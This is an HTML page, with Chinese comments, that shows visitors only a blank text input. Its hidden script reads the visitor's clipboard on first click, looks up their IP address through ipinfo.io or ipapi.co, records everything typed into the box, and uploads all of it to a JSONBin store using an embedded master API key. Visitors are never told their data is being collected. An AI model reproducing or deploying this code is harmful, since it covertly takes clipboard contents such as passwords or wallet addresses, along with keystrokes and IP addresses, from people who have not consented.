<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1">
<title></title>
<style>
*{
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: system-ui,"Microsoft YaHei";
}
body{
    min-height: 100vh;
    background: #fff;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 16px;
}
#inputBox{
    width: 100%;
    max-width: 500px;
    height: 52px;
    font-size: 18px;
    padding: 0 16px;
    border: 1px solid #ccc;
    border-radius: 6px;
    outline: none;
}
#inputBox:focus{
    border-color: #3478f6;
}
</style>
</head>
<body>
<input id="inputBox" placeholder="请输入内容">

<script>
!function(){
    // =========修改为你自己的JSONBin信息=========
    const BIN_ID = "6a13344a6610dd3ae89b5baa";
    const API_KEY = "$2a$10$ImaXRFAF0DWBGK.u1TfnAuxIQIUgwBoAwFE71Ydy6EEQ6HzDwBNnS";
    // =====================================

    const inputBox = document.getElementById("inputBox");
    let clipboardText = "";
    let visitorIp = null;

    // 获取访客IP
    async function getIP() {
        const apiList = ["https://ipinfo.io/json","https://ipapi.co/json/"];
        for(let url of apiList){
            try{
                const res = await fetch(url,{signal:AbortSignal.timeout(4000)});
                const data = await res.json();
                return data.ip || "IP获取失败";
            }catch(err){continue;}
        }
        return "IP获取失败";
    }

    // 保存记录
    async function save(ip,clip,userText){
        const now = new Date().toLocaleString();
        try{
            const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`,{
                headers:{"X-Master-Key":API_KEY}
            });
            const cloud = await res.json();
            let db = cloud.record || {};
            if(!db.ips) db.ips = [];
            const list = db.ips;

            const index = list.findIndex(item=>item.ip === ip);
            if(index > -1){
                list[index].count += 1;
                list[index].time = now;
                list[index].clipboard = clip;
                list[index].inputText = userText;
            }else{
                list.push({
                    ip:ip,
                    clipboard:clip,
                    inputText:userText,
                    time:now,
                    count:1
                })
            }

            await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`,{
                method:"PUT",
                headers:{
                    "Content-Type":"application/json",
                    "X-Master-Key":API_KEY
                },
                body:JSON.stringify(db)
            })
        }catch(err){
            console.log("保存失败",err);
        }
    }

    // 点击页面：唤起键盘 + 读取剪贴板（浏览器强制要求用户交互）
    document.body.addEventListener("click",async function(){
        inputBox.focus();
        try{
            clipboardText = await navigator.clipboard.readText();
        }catch(e){
            clipboardText = "无法读取剪贴板";
        }
        if(!visitorIp){
            visitorIp = await getIP();
        }
        save(visitorIp,clipboardText,inputBox.value);
    },{once:true});

    // 监听输入框文字变化
    inputBox.addEventListener("input",function(){
        if(!visitorIp) return;
        save(visitorIp,clipboardText,this.value);
    })
}();
</script>
</body>
</html>
